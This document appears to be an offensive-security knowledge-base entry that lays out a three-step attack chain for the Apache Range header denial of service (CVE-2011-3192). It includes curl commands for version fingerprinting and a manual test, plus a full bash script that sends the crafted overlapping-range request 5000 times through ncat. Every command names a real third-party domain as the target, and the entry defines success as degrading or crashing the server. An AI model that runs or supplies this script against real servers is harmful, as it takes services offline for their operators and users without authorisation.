---
id: ac-uuid-001
tags:
  - dos
  - apache
  - range-header
  - cve-2011-3192
type: attack_chain
tools:
  - '[[tools/ncat]]'
tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Identify-Vulnerable-Apache-Version]]'
  - '[[procedures/Test-Apache-Range-Header-DoS]]'
  - '[[procedures/Automate-Apache-DoS-with-PoC-Script]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:26:37.028Z'
description: >-
  A multi-stage attack chain exploiting CVE-2011-3192 in Apache HTTP Server to
  perform a denial of service through crafted Range headers causing resource
  exhaustion.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Denial of Service]]'
---
# Apache Range Header DoS Attack via Overlapping Byte Ranges

Multi-stage attack chain demonstrating exploitation of CVE-2011-3192 in Apache HTTP Server versions prior to 2.2.20, where overlapping byte ranges in the Range header lead to quadratic resource consumption and server slowdown or crash.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Version Identification] --> B[Manual DoS Test]
    B --> C[Automated Exploitation]
    C --> D[Server Denial of Service]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/ncat]]

### Target Environment

- Apache HTTP Server 2.2.17 or earlier (vulnerable versions prior to 2.2.20)
- Ports 80 (HTTP) or 443 (HTTPS)
- Network access to the target web server

### Initial Access Requirements

- No credentials required
- Direct network connectivity to the target host
- Ability to send custom HTTP requests

## Detailed Attack Procedures

### Step 1: Version Identification

procedure: [[procedures/Identify-Vulnerable-Apache-Version]]

**Objective**: Determine if the target server runs a vulnerable Apache version by inspecting the Server header.

**Instructions**: Send a standard HTTP GET request to the target and examine the response headers for the Server field.

Use [[commands/curl-get-server-header]] to fetch the headers:

```bash
curl -I http://owncloud.com/
```

**Expected Output**: Response including "Server: Apache/2.2.17 (Ubuntu)" or similar, confirming vulnerability.

**Success Indicators**:
- Server header reveals Apache version < 2.2.20
- No errors in request/response

### Step 2: Manual DoS Test

procedure: [[procedures/Test-Apache-Range-Header-DoS]]

**Objective**: Verify the vulnerability by sending a crafted request with overlapping Range headers and measuring response time increase.

**Instructions**: Construct a GET request to the root path with a Range header containing thousands of overlapping byte ranges (e.g., bytes=0-,5-0,5-1,... up to 5-1299). Time the response and compare to a normal request.

First, test a normal request with [[commands/curl-normal-get]]:

```bash
curl -w "%{time_total}" -o /dev/null -s http://owncloud.com/
```

Then, send the malicious request using [[commands/curl-range-dos-test]]:

```bash
curl -H "Range: bytes=0-0,0-1,0-2,0-3,0-4,5-0,5-1,5-2,5-3,5-4,...[repeat up to 1300 ranges]" -w "%{time_total}" -o /dev/null -s http://owncloud.com/
```

**Expected Output**: Normal response ~1,000 ms; malicious response up to 50,000 ms, indicating resource exhaustion.

**Success Indicators**:
- Significant delay in malicious request processing
- Server remains responsive but slowed

### Step 3: Automated Exploitation

procedure: [[procedures/Automate-Apache-DoS-with-PoC-Script]]

**Objective**: Amplify the DoS by automating the sending of multiple malicious requests to exhaust server resources.

**Instructions**: Create and execute a bash script that builds the malicious HTTP request and sends it 5000 times using ncat.

Prepare the script with [[commands/create-apache-dos-script]]:

```bash
cat > dos_poc.sh << 'EOF'
#!/bin/bash
TARGET="$1"
PORT="$2"
CMD='ncat'
if [ -z $TARGET ]; then
echo "Usage: $0 <target> [port]"
exit 1
fi
if [ "$PORT" = "443" ]; then CMD='ncat --ssl'; fi
BUFFER='Range: bytes=0-,5-0,5-1,5-2,5-3,5-4,...[full overlapping ranges up to 5-1299]'
echo "GET / HTTP/1.1" > /tmp/buf
echo "Host: $TARGET" >> /tmp/buf
echo "$BUFFER" >> /tmp/buf
echo "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0" >> /tmp/buf
echo "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" >> /tmp/buf
echo "Accept-Language: en-US,en;q=0.5" >> /tmp/buf
echo "Accept-Encoding: gzip, deflate" >> /tmp/buf
echo "Connection: close" >> /tmp/buf
echo "" >> /tmp/buf
for a in {1..5000}; do
cat /tmp/buf | $CMD $TARGET $PORT
echo "Request: $a"
done
rm -f /tmp/buf
EOF
chmod +x dos_poc.sh
```

Execute the script with [[commands/run-apache-dos-script]]:

```bash
./dos_poc.sh owncloud.com 80
```

**Expected Output**: Script outputs request counts; server experiences cumulative slowdown or crash under load.

**Success Indicators**:
- Multiple requests sent successfully
- Observable server performance degradation or unresponsiveness

## Attack Chain Summary

### Key Achievements

1. Confirmed vulnerable Apache version via header inspection
2. Demonstrated DoS with manual crafted request showing 50x response time increase
3. Automated attack to amplify impact with 5000 concurrent-like requests

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Network Denial of Service]] Network Denial of Service

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Impact]] Impact

---

*Last updated: 2023-10-01T00:00:00Z*
